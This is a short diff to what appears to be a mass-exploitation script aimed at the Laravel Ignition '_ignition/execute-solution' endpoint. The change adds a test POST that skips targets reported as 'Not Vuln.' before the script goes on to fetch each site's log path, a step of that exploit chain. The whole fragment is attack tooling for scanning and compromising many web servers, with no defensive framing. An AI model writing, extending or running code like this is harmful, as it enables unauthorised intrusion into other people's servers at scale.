@@ -11,6 +11,9 @@ def Mass(uri):
     try:
         Expl = Exploit()
         Expl.uri = f'{uri}/_ignition/execute-solution'
+        if not Exploit.testPost(Expl.uri):
+            print('[-] '+ Color.red(uri) + ' | Not Vuln.')
+            return False
         getLog = Exploit.getLogpath(uri)
         if not getLog:
             print('[-] ' + Color.red(uri))
